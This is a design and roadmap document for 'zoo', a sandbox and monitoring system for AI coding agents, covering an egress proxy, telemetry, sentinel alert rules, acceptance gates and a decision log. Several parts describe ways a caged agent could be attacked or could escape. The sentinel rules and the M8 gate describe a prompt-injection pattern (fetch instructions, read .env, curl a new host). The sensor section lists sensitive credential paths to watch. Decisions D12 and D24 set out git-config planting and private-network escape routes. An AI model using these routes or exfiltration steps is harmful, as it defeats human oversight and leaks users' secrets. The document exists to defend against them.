| tiny | 1 | 1 GiB | 5 GiB | 512 |
| small (default) | 2 | 2 GiB | 10 GiB | 1024 |
| medium | 4 | 4 GiB | 20 GiB | 2048 |
| large | 6 | 8 GiB | 40 GiB | 4096 |

`--size cpus:memory` for one-offs; custom profiles in config; per-repo default in `zoo.yaml`. Optional `on_limit: alert|pause|kill` (default alert). Optional per-session budget (wall time; tokens when the harness reports them) that pauses the agent.

### 10.7 Docker inside a cage — M6

Only on `vm`/`microvm` isolation: run `dockerd` inside the guest (rootless or rootful inside the VM), its egress also forced through the keeper (`HTTP(S)_PROXY` in daemon.json + the cage network has no other route anyway). Never on `container` isolation.

---

## 11. Visibility and telemetry

Five layers, trusted in proportion to their distance from the agent:

| Layer | Source | Runs | Trust | Milestone |
|---|---|---|---|---|
| Network | keeper log | host side | authoritative | v0 |
| Resources | backend stats | host side | authoritative | v0 (live), M4 (history) |
| Files | watcher on the host side of the worktree mount | host | authoritative | M4 |
| Processes | in-guest eBPF (Tetragon) → `zoo-sensor` | guest, root | evidence | M8 |
| Agent | harness OTel → zood OTLP receiver | guest, agent | hint | M7 |

### 11.1 OpenTelemetry

- zood embeds an OTLP receiver (gRPC 4317 + HTTP 4318) **reachable only from cages** via vsock bridge or the cage network (host-only listener), never from the internet; it also accepts zood-internal events. Option: run the upstream OTel Collector as a sidecar process if embedding gets heavy (decision log).
- Every record gets `zoo.cage`, `zoo.session`, `zoo.harness`, `zoo.agent` resource attributes, added **host side** (don't trust the guest to label itself).
- Fan-out: optional OTLP exporter config to Grafana/Jaeger/Honeycomb.

### 11.2 Harness adapters

- **Claude Code:** env `CLAUDE_CODE_ENABLE_TELEMETRY=1`, `OTEL_LOGS_EXPORTER=otlp`, `OTEL_METRICS_EXPORTER=otlp`, `OTEL_EXPORTER_OTLP_PROTOCOL=http/protobuf`, `OTEL_EXPORTER_OTLP_ENDPOINT=<zood>`; traces need `CLAUDE_CODE_ENHANCED_TELEMETRY_BETA=1` + `OTEL_TRACES_EXPORTER=otlp`. Content redacted unless `OTEL_LOG_USER_PROMPTS=1`, `OTEL_LOG_TOOL_DETAILS=1` (and `OTEL_LOG_TOOL_CONTENT=1` for tool output in traces). Events: `claude_code.user_prompt`, `tool_decision`, `tool_result`, `api_request`, `api_error`, …, each with `session.id`, `prompt.id`, `event.sequence`. Span tree: `claude_code.interaction` → `llm_request`, `tool` → `tool.execution`.
- **Codex:** `~/.codex/config.toml` `[otel]` with `[otel.exporter.otlp-http]` (logs), `[otel.trace_exporter.otlp-http]`, `[otel.metrics_exporter.otlp-http]`; `log_user_prompt = true` to include prompt text; events `codex.user_prompt`, `codex.tool_result`, request/SSE events. zood writes this file into the session's guest home at exec.
- **Others:** adapter interface that tails session files in the guest home (read via the backend's exec, host side) and emits normalized events. Without an adapter, a harness still gets the three host-side layers.
- Content capture is **on by default locally** (data never leaves the machine) with a config switch `capture_content: false`.

### 11.3 AG-UI normalization (M7)

Each session is exposed as an AG-UI event stream (`GET /api/sessions/{id}/agui`, SSE). `threadId` = cage, `runId` = session.

| Source | AG-UI events |
|---|---|
| session start / end / crash | `RUN_STARTED`, `RUN_FINISHED`, `RUN_ERROR` |
| user prompt / assistant reply | `TEXT_MESSAGE_START`, `TEXT_MESSAGE_CONTENT`, `TEXT_MESSAGE_END` (role from source) |
| tool call | `TOOL_CALL_START`, `TOOL_CALL_ARGS`, `TOOL_CALL_END`, `TOOL_CALL_RESULT` |
| reasoning (when exposed) | `REASONING_*` |
| cage resources / status | `STATE_SNAPSHOT` then `STATE_DELTA` |
| network / process / file events, alerts | `CUSTOM` with `name`: `zoo.net.request`, `zoo.proc.exec`, `zoo.file.changed`, `zoo.alert` |
| anything unmapped | `RAW` with the original record |

Event names per the AG-UI spec (`RUN_STARTED`, `RUN_FINISHED`, `RUN_ERROR`, `STEP_*`, `TEXT_MESSAGE_*`, `TOOL_CALL_*`, `REASONING_*`, `STATE_SNAPSHOT`, `STATE_DELTA`, `MESSAGES_SNAPSHOT`, `ACTIVITY_*`, `RAW`, `CUSTOM`). Use the official AG-UI TypeScript client in the dashboard; generate Go structs from the spec's JSON schema if available, else hand-write the subset above with golden tests.

### 11.4 Guest sensor (M8)

- Tetragon in the guest (or a minimal eBPF program in `zoo-sensor`) watching: `execve` (exe, argv with secrets redacted by pattern), opens of sensitive paths (mask patterns, `/proc/*/environ`, `/etc/shadow`, credential paths), `connect` attempts (to anything but the keeper), setuid/capset, module loads, mount calls.
- Events stream to the host over vsock (or host-only TCP) **immediately**, with a sequence number; zood detects gaps.
- Heartbeat every 2 s; missing for 10 s while the cage is running → `crit` alert "sensor silent".
- If the guest kernel lacks BTF/eBPF features: ship a zoo kernel for backends that allow custom kernels (Apple `container` does), else degrade to `/proc` polling with a dashboard note.

### 11.5 File watcher (M4)

- Host-side watcher (FSEvents on macOS via `fsnotify`, inotify on Linux) on each running cage's worktree (and git dir), debounced.
- Records create/modify/delete/rename with size; content diff on demand in the dashboard (computed host side, not stored by default).
- Alerts: change to a CI config (`.github/workflows/*`), package scripts (`package.json` `scripts`, `Makefile`, `justfile`), git hooks paths (should be impossible), new file matching a mask pattern.

### 11.6 Sentinel rules

| Rule | Level | Milestone |
|---|---|---|
| keeper denied a request (dedupe per cage+host, 10 min) | warn | v0 |
| bytes out to one host > threshold (default 5 MB) | crit | v0 |
| first-ever host for this project | info | M2 |
| DNS attempt from a cage | warn | M8 |
| sensitive path opened | crit | M8 |
| injection shape: untrusted fetch → sensitive read → new egress, within one session, 5 min | crit | M8 |
| sensor heartbeat missing | crit | M8 |
| privilege change in guest | crit | M8 |
| CPU at cap 5+ min / mem > 90% / disk > 80% | warn | M4 |
| tool-call claim vs observed mismatch (tool says `npm test`, sensor sees `curl` + denied host) | warn | M8 |

Each alert carries evidence (event ids) and links to the session timeline at that moment. Channels: dashboard, ntfy, Slack webhook, macOS notification. Severity can map to an action: `alert` (default), `pause` (freeze the cage), `kill`.

---

## 12. Dashboard

v0 is one static page. M7 replaces it with TypeScript + React (Vite), embedded via `go:embed`, no runtime CDN (CSP `default-src 'self'`). Keep the v0 page working until the React one reaches parity.

### 12.1 Views

1. **Cages** (v0 basic): card per cage: name, worktree, backend + **isolation level badge**, size, status, live CPU / memory / disk / network vs limits, sessions (harness + agent), request/deny counts, planted-repo alerts. Actions: stop, reset, resize, open shell (copies command), open SSH (M6).
2. **Network** (v0 basic): live feed across cages; search (terms AND'd, `-term` excludes, `host:` `cage:` `status:` prefixes at M3); filters: cage, verdict (all/allowed/denied/new), time range (M3); pause; per-session destinations with first-seen markers; bytes-out over time per host; deny queue with Allow (this project / everywhere / ignore).
3. **Resources** (M4): per-cage and whole-host charts over time; "right-size" hints from observed peaks.
4. **Sessions** (M7): list per cage; AG-UI timeline per session interleaving prompts, tool calls (args/results), and the network/process/file events they caused; click a denied request → jump to the tool call behind it.
5. **Alerts** (v0 strip, M3 full): filter, ack, evidence, jump to timeline.
6. **Allowlist** (M2): rules with scope, origin, date, reason; edit; blocked candidates.
7. **Settings / Doctor** (M3): run the escape suite per cage and show results; backend status.

### 12.2 API

Existing: `GET /api/state`, `GET /api/stream` (SSE: `state`, `net`, `alert`), `POST /api/cages/{id}/stop`, `POST /api/allow`, `POST /api/sessions`, `DELETE /api/sessions/{id}`.
Add as needed, versioned under `/api/v1/…` once the React UI lands; keep the v0 routes until it ships. All writes require `X-Zoo-Token`; all requests require a loopback `Host` (or authenticated ingress on k8s).

### 12.3 UX rules

- Fast on 10k+ events: virtualized table, server-side filtering beyond the last 5k.
- Never hide that a cage runs at weaker isolation.
- Every alert explains *why* in one line and links to evidence.
- Keyboard: `/` search, `Esc` clear, `p` pause, `j/k` move.

---

## 13. CLI, config, and integrations

### 13.1 CLI (target)

Existing commands stay (see README). Add:

| Command | Milestone |
|---|---|
| `zoo backend [list\|use <name>]` | M1 |
| `zoo status` (backend, keeper, daemon, isolation, shims, versions) | M1 |
| `zoo gc` | M2 |
| `zoo allow --project\|--global\|--harness X <host>` | M2 |
| `zoo logs [cage] [--follow] [--denied]` | M3 |
| `zoo resize <cage> <size>` | M3 |
| `zoo ssh <cage>` / `zoo ssh-config` | M6 |
| `zoo sessions [cage]` | M7 |
| `zoo sync` / `zoo pull` (k8s) | M9 |
| `zoo service install\|uninstall` (launchd/systemd for zood) | M3 |

### 13.2 Config

`~/.zoo/config.yaml` (global), `zoo.yaml` (per repo). What's implemented today is in the [guide's config reference](guide.md#config-reference) (including `services`, `credentials`, `git`, `cache`, `image`, `preview_port`, `docker.runtime`, and `zoo.yaml`'s `mounts`). Target schema, for what's still to come:

```yaml
backend: auto            # auto|apple|docker|k8s|lima|firecracker
runtime: auto            # docker: auto|runc|runsc|kata
isolation_floor: microvm # refuse weaker unless overridden per run
port: 7777
default_size: small
sizes: { … }             # see 10.6
masks: [ … ]
unmask: [ … ]
capture_content: true    # harness prompts/tool args stored locally
retention_days: 30
bytes_out_alert: 5242880
alerts:
  ntfy_url: ""
  slack_webhook: ""
  macos_notifications: true
  actions: { crit: alert, warn: alert }
harnesses:
  claude: { command: claude, env: { CLAUDE_CODE_OAUTH_TOKEN: claude }, allow: [api.anthropic.com] }
  codex:  { command: codex, env: { OPENAI_API_KEY: codex }, files: { .codex/auth.json: codex-auth } }
  pi:     { command: pi, env: { ANTHROPIC_API_KEY: anthropic } }
docker:  { bin: docker }   # or podman
k8s:     { context: homelab, namespace: zoo, runtime_class: kata, storage_class: local-path }
export:  { otlp_endpoint: "" }
```

```yaml
# zoo.yaml (per repo)
size: medium
harness: claude
allow: [api.stripe.com]
mask: ["config/*.secret.json"]
unmask: [".env.test"]
```

Config is validated on load with clear errors (path + key + expected).

### 13.3 Doors

- **Shims** (v0): `~/.zoo/shims/<harness>`; `ZOO=off` bypass; inside a cage (`ZOO_INSIDE`) they exec the real binary.
- **SSH** (M6, D37): `ssh zoo-<cage>` with `ProxyCommand zoo ssh-proxy <cage>`, which runs `sshd -i` as `agent` over the backend's exec: no listener anywhere. Key in `~/.zoo/ssh/`, entries in `~/.zoo/ssh/config` (the user adds the `Include`). Must not open any path from the cage to the host.
- **Previews** (D38): `http://[<port>.]<cage>.localhost:<preview_port>` proxied by zood over exec.
- **Direct**: `zoo run`, `zoo shell`.

### 13.4 Integration guides (write one page each under `docs/integrations/`)

| Tool | Door | Notes to verify and document |
|---|---|---|
| Conductor | shim | Does it inherit login-shell `PATH`? Where to set a custom agent path? Worktree location. |
| Orca (onorca.dev) | shim (local), SSH (remote mode) | `orca.yaml` custom commands; remote target config; terminals per worktree. |
| herdr | shim | |
| Claude Code | all | `claude setup-token`; `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` in image |
| Codex | all | API key vs ChatGPT login (auth.json) |
| pi, opencode, aider, gemini-cli, Amp | shim/direct | install in image; allowlist entries; adapter status |
| VS Code / Cursor Remote-SSH, JetBrains Gateway | SSH | |

---

## 14. Milestones and acceptance gates

Each milestone ends with a **gate**: concrete commands with expected results. A milestone is done only when its gate passes (or is marked `needs-hw-verify` with the fake-harness equivalent passing).

### M0: Harden v0 on Apple (verify on real hardware)

- Verify every item in 6.4; fix what breaks. Replace heuristics with exact field names once observed (keep heuristics as fallback).
- Keeper IP stability: if Apple can't pin it, make the cage-level env not matter (sessions always pass current proxy env; already true) and have `zoo up` print affected cages.
- Add `zoo status`.
- Add a `zoo-init` mode that detects missing mount capability and reports it clearly.
- **Gate:** on macOS 26: `zoo up && cd <repo with .env> && zoo doctor` → all PASS (host-exposure may WARN). `zoo run claude -- -p "curl -s https://example.com; cat .env"` → dashboard shows the denied request, `.env` reads empty. Repeat for a git worktree created with `git worktree add`.

### M1: Backend interface + docker backend

- Introduce `internal/backend` (7.2); move Apple code to `backend/apple`; add `backend/docker` (8.2) for Docker Engine, Docker Desktop, OrbStack, colima, Podman.
- Host-side masking/git guard for docker; `zoo-init` tolerant of no capabilities.
- `zoo backend`, `zoo status`, isolation badge in `zoo ls` and dashboard (I12), `isolation_floor`.
- Contract test suite runnable against any backend (16.2).
- **Gate:** Linux CI (GitHub Actions ubuntu) with Docker: build images, `zoo up --backend docker --isolation-floor container`, run the escape suite in a cage → all PASS; the contract suite passes for docker and the fake apple backend.

### M2: Allowlist layers, gc, first-seen

- Layered allowlists (9.3) with scope + provenance; dashboard Allow chooses scope; `zoo allow --project|--global|--harness`.
- `zoo gc`. First-seen-host info alerts.
- **Gate:** two cages, project A allows `api.stripe.com`, project B doesn't → request from B is denied, from A allowed; logs show scope used.

### M2S: Services, grants, SSH agent, secret sources

Owner request (2026-10-28): teach zoo about the things agents need besides web hosts, and say which cage gets what.

- **Service** (config `services:` in `~/.zoo/config.yaml`), one of:
  - `host: 127.0.0.1:5432`: something on the host. Reached via the **host bridge** (below); nothing on the host needs to bind `0.0.0.0`.
  - `image: postgres:16` (+ `port`, `env`, `volume`): a **sidecar** zoo runs on the internal `zoo-services` network, which only the keeper joins. Data in `~/.zoo/services/<name>/` when `volume` is set.
  - `remote: github.com:22`: a non-HTTP destination the keeper dials.
  - `ssh-agent: <socket path | bitwarden | 1password | system>`: an SSH agent on the host, exposed through zoo's filtering agent proxy (keys, destinations, optional approval).
- **Grant**: cage → service. Effective grants = repo `zoo.yaml` `services:` ∪ `zoo grant` entries (`~/.zoo/grants.json`). `zoo grant|revoke <cage> <service>`, `zoo service ls`, dashboard Grant/Revoke.
- **Gate**: a small Go TCP forwarder (`zoo-gate`, stdlib only, built in the keeper image) next to squid. One listener per service on the keeper (the service's port; collisions are config errors; 3128 reserved). Config `/etc/zoo/gate.json` written by the host (services, targets, allowed cage IPs, bridge address and token); the gate reloads on change. Connections from a cage without a grant are refused and logged. Log: `/var/log/zoo/gate.log`, JSON lines `{ts, client, service, target, verdict, bytes_in, bytes_out, ms}`.
- **Names in the cage**: `/etc/hosts` gets `<service>.zoo → keeper IP` for granted services (written as guest root, which owns the file; the agent user can't edit it). Env hints where conventional (`PGHOST`, `REDIS_URL`). `ssh-agent` services: a relay in the cage puts the socket at `$SSH_AUTH_SOCK=/run/zoo/ssh-agent.sock` per session. `remote` services on port 22 get an `ssh_config` entry with `HostName <svc>.zoo` + `HostKeyAlias <real host>`.
- **Host bridge** (in zood): listens on an address the keeper can reach and cages can't (apple: the `default` network's host IP, verified; docker: per runtime, verify). Each connection starts with `ZOO1 <token> <service> <cage>\n`; the token is in `gate.json` (host-only, mounted into the keeper only). zood requires the daemon to be running for host and ssh-agent services.
- **SSH agent proxy** (zood, `internal/sshagent`): lists only the granted keys; signs only for allowed destinations, checked via the `session-bind@openssh.com` host key against known host keys; optional per-use approval on the dashboard; every list/sign logged with cage, key, destination, verdict. Private keys never leave the host agent.
- **Secret sources** (`internal/keys`): harness/repo env values may name `bw:<item>[/<field>]` (Bitwarden CLI) or `op://vault/item/field` (1Password CLI) besides Keychain items; fetched on the host per session, injected like today. Never expose a vault session to a cage.
- **Per-cage networks** (docker): each cage gets its own internal network, keeper connected (`network connect`), so cages can't reach each other. Apple can't attach networks to a running instance, so Apple cages keep the shared network (doctor checks lateral reachability and warns).
- **Gate:** host Postgres granted to cage A and not B → A connects via `pg.zoo`, B is refused and logged; sidecar redis reachable only from granted cages; `ssh -T git@github.com` from a granted cage works through the agent proxy with the key never in the cage, signing for another host is refused; dashboard shows connections and signs.

### M3: Store, daemon as a service, API v1

- Store (7.3) with retention; backfill from squid logs on first run.
- `zoo service install` (launchd agent / systemd user unit); CLI talks to zood API.
- `zoo logs`, `zoo resize`, alerts view with ack; search prefixes and time ranges; server-side queries.
- **Gate:** restart machine (or kill zood); history and alerts persist; 100k synthetic events: dashboard filter round-trip < 300 ms.

### M4: Files + resource history

- File watcher (11.5) with alerts; resource history charts; limit alerts; disk limits where supported.
- **Gate:** agent edits `package.json` scripts → alert with diff; CPU-burner in a cage → sustained-CPU alert; resources view shows the spike.

### M5: Shared cages, per-agent identity

- Per-agent users, homes, credentials, cgroups (10.5); proxy auth per agent (9.4); per-agent allowlist overrides; dashboard lanes per agent.
- **Gate:** two agents in one cage; each one's requests are attributed correctly; agent-2 can't read agent-1's credential file; reviewer agent limited to model API is denied elsewhere.

### M6: SSH door + Docker-in-cage

- SSH (13.3) with ssh-config generation; Orca remote mode documented and tested; Docker-in-cage on vm/microvm isolation (10.7).
- **Gate:** `ssh zoo-<cage> 'whoami; curl -s https://example.com'` → `agent`, denied; Orca remote targets a cage and runs Claude Code there; `docker run hello-world` inside an Apple cage works and its pull is visible in the keeper log.

### M7: Harness OTel + AG-UI + React dashboard

- OTLP receiver, Claude Code + Codex adapters (11.2), AG-UI translator (11.3), Sessions view, React dashboard at parity with v0 page plus Sessions.
- **Gate:** run a Claude Code session that uses Bash and WebFetch; Sessions view shows prompts, tool calls with args/results, and the keeper requests interleaved in order; AG-UI stream validates against the official TS client in a test.

### M8: Guest sensor + correlation rules

- `zoo-sensor` with Tetragon or eBPF (11.4); vsock/TCP transport; heartbeat; sentinel rules for DNS attempts, sensitive opens, injection shape, privilege change, claim/observe mismatch.
- **Gate:** scripted "injection" scenario (fetch a page containing instructions → `cat .env` attempt → `curl` to new host) raises the injection-shape alert with linked evidence; killing the sensor as root raises "sensor silent" within 10 s.

### M9: Kubernetes (+ Kata) and Lima

- k8s backend (8.4), Helm chart, `zoo sync`/`zoo pull`, in-cluster dashboard with auth. Lima fallback (8.5).
- **Gate:** on k3s with Kata (Proxmox): `zoo run --backend k8s claude` in a repo → pod with `runtimeClassName: kata`, egress only via keeper (escape suite PASS), results pullable with `zoo pull`. On an Intel Mac or macOS 15: Lima backend passes the escape suite.

### M10: docker+kata/runsc on Linux; optional Firecracker

- Runtime selection and detection (8.3); nested-virt guidance; Firecracker driver only if justified in 15.
- **Gate:** Linux host with Kata: `zoo ls` shows `microvm`; escape suite PASS; gVisor host shows `sandboxed-container`.

### M11: Release

- goreleaser: darwin/arm64, darwin/amd64, linux/amd64, linux/arm64; Homebrew tap; signed/notarized macOS binary (needs human for certs); checksums; SBOM; container images published (needs human for registry creds).
- Docs site or polished README; integration guides complete; security policy (`SECURITY.md`); threat model page.
- Name check: `zoo` collisions on GitHub/Homebrew; rename if needed (ask human).
- **Gate:** fresh macOS and Linux machines: install from release artifacts, follow README quickstart, escape suite PASS.

---

## 15. Decision log

Append new decisions at the bottom. Format: `D<n> (date): decision — why — alternatives rejected`.

- **D1 (2026-10-28): VM per cage by default.** Kernel separation between agents, safe Docker-in-cage, hard limits. Containers allowed only as explicit, visible downgrade. Rejected: containers by default (shared kernel, Docker socket temptation).
- **D2 (2026-10-28): squid as the keeper, outside the cage.** Owner's explicit choice; mature, CONNECT allowlisting by hostname, solid logging, `-k reconfigure` without drops. Rejected for now: Go-native proxy (revisit only per 9.6), Cilium-only (k8s-specific), TLS interception (privacy and complexity).
- **D3 (2026-10-28): One cage per worktree; sessions inside.** Matches how Orca/Conductor keep worktrees for days. Rejected: VM per agent run (fights orchestrators).
- **D4 (2026-10-28): Go for CLI/daemon; TypeScript + React for the dashboard (from M7).** Go fits k8s, OTel, Tetragon, Kata ecosystems and ships as one binary; React fits AG-UI/CopilotKit clients. Rejected: Rust daemon (loses k8s/OTel libs).
- **D5 (2026-10-28; for docker reads, superseded by D25): Shell out to runtime CLIs (`container`, `docker`/`podman`, `kubectl` optional) rather than SDKs, except k8s (client-go).** Smaller deps, version-tolerant; JSON read loosely. Revisit per backend if parsing is fragile.
- **D6 (2026-10-28): OpenTelemetry for transport/storage, AG-UI for session presentation.** Standard instrumentation in; one rendering model out for any harness.
- **D7 (2026-10-28): Names.** Product `zoo`; sandboxes are **cages**; proxy is the **keeper**; daemon `zood`; dashboard "visitor center" informally.
- **D8 (2026-10-28): v0 dashboard is a single embedded static page.** Owner wanted something usable same day; React later.
- **D9 (2026-10-28): Agents commit, humans push (default).** Single-repo push tokens are opt-in per project. (Owner asked to confirm; open in 18.)
- **D10 (2026-10-28): Docker backend uses host-side masking.** Lets cages run with `--cap-drop ALL`; guest-side masking reserved for VM backends without file mounts.
- **D11 (2026-10-28): Apple uses host-side masking too, and cages drop all capabilities.** Verified on 1.6.1: the guest root has Docker's default capability set (no CAP_SYS_ADMIN), so v0's in-guest bind mounts failed; `-v file:path:ro` works (`--mount` rejects files). A file `-v` shares its parent directory with the guest, reachable only with CAP_SYS_ADMIN, so the mask file lives alone in `~/.zoo/mask/`. Rejected: `--cap-add CAP_SYS_ADMIN` for zoo-init (gives the guest the power to undo the masks).
- **D12 (2026-10-28): Pin directories that hold protected paths.** Every directory between a mount root and a read-only path is mounted onto itself, because a rename carries nested read-only mounts away (`mv .git .git2`, then write a fresh `.git/config` the host runs). On Apple a directory mount is dropped when the same directory is the parent of a file mount, so read-only files inside pinned directories are mounted from a staged copy under `~/.zoo/stage/<cage>/` (host edits visible after `zoo reset`). Rejected: making `.git` wholly read-only (agents must commit).
- **D13 (2026-10-28, superseded by D24): Learn mode is keyed by cage name**, rendered into squid's src ACL from current IPs on every cage start/stop and daemon poll. Apple reassigns IPs on restart.
- **D14 (2026-10-28): Docker cages keep a writable root filesystem** (parity with Apple), not `--read-only` + tmpfs home: Docker tmpfs mounts are `noexec` by default and the image's pre-seeded agent home would be hidden. Persistence is per cage and cleared by `zoo reset`. Revisit with M5 per-agent homes.
- **D15 (2026-10-28): Docker keeper sits on zoo's own `zoo-egress` bridge**, not the default `bridge`, so unrelated containers can't use it as a proxy. Keeper keeps CHOWN/SETUID/SETGID/DAC_OVERRIDE/FOWNER (squid drops to `proxy`), everything else dropped.
- **D17 (2026-10-28): Image tags are versioned (`zoo-cage:m1`, `zoo-keeper:m1`), and instances carry a `zoo.image` label.** On `zoo up` a keeper from another image is replaced (it's stateless); a stopped cage from another image is recreated on its next run; a running one gets a warning to `zoo reset` it. This is how v0 installs pick up the fixed guard and keeper without manual steps. Bump the tag when images or expected mounts change.
- **D18 (2026-10-28): Services go through a gate in the keeper, not new routes.** The keeper stays the only thing a cage can reach; `zoo-gate` (stdlib Go, built in a multi-stage keeper image) forwards granted services and logs every connection. Rejected: publishing host ports into cages (no grants, no log), socat per service (no per-cage ACL or logging).
- **D19 (2026-10-28): Host services and SSH agents reach the host through zood's bridge**, bound where only the keeper can connect (Apple: the `default` network's host IP; OrbStack/Desktop: 127.0.0.1 via `host.docker.internal`; Linux: the egress bridge gateway) and authenticated by a token in `gate.json`. Host services can stay on 127.0.0.1.
- **D20 (2026-10-28): Sidecars live on an internal `zoo-services` network only the keeper joins**, so grants are enforced by the gate even on Apple, where cages share a network.
- **D21 (2026-10-28): The gate runs unprivileged; service ports below 1024 move up by 20000** (github.com:22 → 20022, with an ssh_config entry so `git@github.com:` works unchanged).
- **D22 (2026-10-28): The SSH agent proxy refuses signs with no `session-bind` when a service restricts hosts.** Means OpenSSH ≥ 8.9 in the cage (Debian bookworm has 9.2) and no commit signing on host-restricted keys; unrestricted keys still sign. Every list/sign is logged; private keys never leave the host agent.
- **D23 (2026-10-28): Docker internal networks get no host address** (`inhibit_ipv4`). Found by the escape suite in CI: on Linux, the bridge gateway is the host, reachable on every port it listens on. Existing zoo networks are replaced when unused.
- **D24 (2026-11-02): Red-team fixes. No learn mode; private destinations refused; the git guard covers every worktree and submodule; planted repositories are detected on the host.** (a) Learn mode allowed any destination, including `host.docker.internal` (the host's loopback on Docker Desktop and OrbStack), the LAN and cloud metadata; the owner prefers approving each host by hand, so it's gone and `zoo blocked` lists the queue. (b) squid denies private, loopback, link-local, CGNAT (tailnets) and multicast addresses, and `.localhost`/`.internal`/`.local` names, before the allowlist, so an allowlisted name resolving to a private address is refused. `::ffff:0:0/96` and `::/128` are deliberately absent: squid stores IPv4 as v4-mapped, so they read as 0.0.0.0/0. (c) `.git/worktrees` and `.git/modules` (and a linked worktree's own `modules/`) are read-only, with this worktree's own gitdir reopened rw on top (`CageSpec.ReopenRW`; mount order ro dirs, reopened dirs, ro files). Before, a cage could rewrite another worktree's `commondir` or a submodule's config and the host's git would run what it pointed at. An empty `config.worktree` is created so it can be mounted ro. (d) Mounts can't stop the agent writing `sub/.git`, a `.git` file pointing at its own git dir (under a forged gitlink, `git status` at the top level recurses into it) or a bare repo, any of which bring a config the host's git, prompt or editor would honour. `cage.GitTraps` finds them on the host: after each `zoo run` session, every 30 s in the daemon (critical alert), and in `zoo doctor` (fails). Detection, not prevention; `safe.bareRepository=explicit` closes the bare variant. Images bumped to m3 so existing cages are recreated with the new mounts.
- **D25 (2026-11-02): zood reads docker through the Engine API, waits for events instead of polling, and never shows a window. Partly supersedes D5 for docker.** *What happened:* the first live Windows test froze the owner's desktop. zood was started with `DETACHED_PROCESS` (no console at all), so every console program it launched got a console of its own, which Windows Terminal (the default terminal) opened as a window: about 40 windows in 90 seconds. *Why it was that many:* the refresh loop shelled out on a timer. Every 2 s it ran `docker ps`, `docker inspect` on every container, `docker info` and `docker network inspect` (services sync asking for the host bridge), and `docker stats`; every 30 s, `git rev-parse` per cage. That is 5+ processes every 2 s, all day. On macOS this is cheap and went unnoticed; on Windows each launch also costs a console host, and hiding the windows alone would still have left that load. *Decision:* (1) Reads go through the Engine API over its local socket (`\\.\pipe\…` via go-winio on Windows, Unix socket elsewhere), found once from `DOCKER_HOST` or the current docker context: list, inspect, info, networks. (2) The daemon refreshes cages on `/events` (zoo containers and networks; exec events ignored), with a 30 s safety poll; backends without events (Apple, podman) keep the 2 s poll. (3) Stats come from one long-lived `/stats` stream per running cage, with CPU% computed the way `docker stats` does. (4) The daemon starts with `CREATE_NO_WINDOW`, so its children inherit a hidden console, and every captured-output command is started with it too (`proc.Quiet`). Interactive ones (`zoo run`, `zoo shell`) keep the user's console. (5) The planted-repo scan caches each worktree's git dirs for 5 minutes. *Result, measured* (daemon in a Linux container against Docker Desktop's engine, `docker` replaced by a logging stub): zero process launches at startup, over 30 s of steady state and across two lifecycle events; a cage stop showed up in 0.15 s and a start in 0.26 s, against up to 2 s before. *Why not the Docker SDK:* D5's reasons stand. The client is a few hundred lines of stdlib HTTP over unversioned paths with loosely read JSON; the one new dependency is go-winio (Docker's own named-pipe package, Windows only), pinned at v0.6.2 so the module stays on Go 1.24. *Kept on the CLI:* everything that changes state (create, start, network, build) and exec, which needs the terminal; podman; any docker whose socket isn't local (tcp://, ssh:// contexts), or `ZOO_DOCKER_API=off`. Guarded by `TestDaemonReadsUseTheAPI` (the CLI is a nonexistent binary) and, on Windows, `TestDetachHidesInsteadOfDetaching`. *Process rule:* don't run zood on a developer's desktop to test it; run it in a container against the engine socket.
- **D26 (2026-11-02): Windows hosts use Docker Desktop, with Windows paths mapped into the cage.** A cage can't mount `C:\Users\me\repo` at the same path, so guest paths use the Git Bash form `/c/Users/me/repo` (`backend.GuestPath`), applied to every mount target, the exec working directory and doctor's lists. Git's pointer files hold host paths (`gitdir: C:/…`), so a linked worktree's `.git` (and an absolute `commondir`) is shown to the cage as a read-only rewritten copy (`CageSpec.Files`); the host file is untouched. Docker Desktop shows Windows files to the guest as root-owned, so git in the cage gets `safe.directory=*` through `GIT_CONFIG_*` (that check guards against other users' repos; inside a cage everything is the agent's), plus the host's `core.autocrlf`, without which every CRLF file reads as modified. Path checks use the OS separator (`within` compared against `../` and so treated outside paths as inside on Windows; path masks never matched `\`). Image sources are LF regardless of `core.autocrlf` (`.gitattributes`, and `WriteImage` strips CR), because a CRLF `#!/bin/sh` won't run. UNC paths are refused. Verified: `zoo up` and `zoo doctor` (all walls hold) in a main checkout and a linked worktree on Docker Desktop 29.9; git status and commit from the cage through the rewritten pointer. Still Unix-only: keychain storage (falls back to 0600 files), shims (shell scripts), the SSH agent proxy (needs the OpenSSH named pipe).
- **D27 (2026-11-02): Branch moves are reported, not prevented.** A cage must write the repo's refs (its commits have to be visible outside), and mounts can't separate one ref from another, so an agent can move `main`, forge `origin/main` to look pushed, or re-point the main checkout's HEAD, and the human pushes it. `zoo run` snapshots the refs as a session starts (`~/.zoo/refs/<cage>.json`) and reports, at its end, everything changed besides the cage's own branch, each with the command that undoes it; the daemon checks every 30 s (dashboard warning), `zoo doctor` warns, `zoo refs [ok]` lists or accepts. Alarms nobody accepted survive into the next session's baseline instead of being absorbed. New local branches are notes, not alarms; stash, bisect, notes and rewritten refs are git's own bookkeeping and ignored. Refs are read from the files (loose + packed-refs), not `git for-each-ref`, so the daemon check starts no process (D25); reftable repos aren't watched. *Limit:* the files don't say who changed a ref, so a host-side fetch during a session is reported too; that's why these are warnings, not failures. Rejected: a per-cage clone or ref namespace (would change how agents and humans share branches), and reflog attribution (the agent can write refs and reflogs directly).
- **D28 (2026-11-02): Masks look where secrets actually end up, and fail closed.** The scan skipped `dist`, `build`, `.next`, `.turbo`, `.cache` and stopped at depth 6 and 256 hits, so a Next.js standalone build's copied `.env`, or anything deeper, stayed readable, and hits past 256 were silently unmasked. Now only dependency trees are skipped (`node_modules`, `vendor`, virtualenvs, `target`, `.gradle`, `.terraform`), depth is 12, and over 512 matches the plan fails (also about as many mounts as a Windows command line holds) with a pointer to `unmask:`. Defaults add keystores, cloud and kube credentials, `*.tfvars`/`*.tfstate`, `secrets.*`, `.envrc`, `.dev.vars`, `.git-credentials`; `unmask` is `*.example`, `*.sample`, `*.template`, `*.pub`. Path patterns (`.kube/config`) match at any depth, `/`-prefixed ones only at the root; names compare case-insensitively on macOS and Windows. Cages carry a fingerprint of their masked set (`zoo.masks`), so a secret added after creation makes the cage stale: recreated at its next start, a warning while it runs.
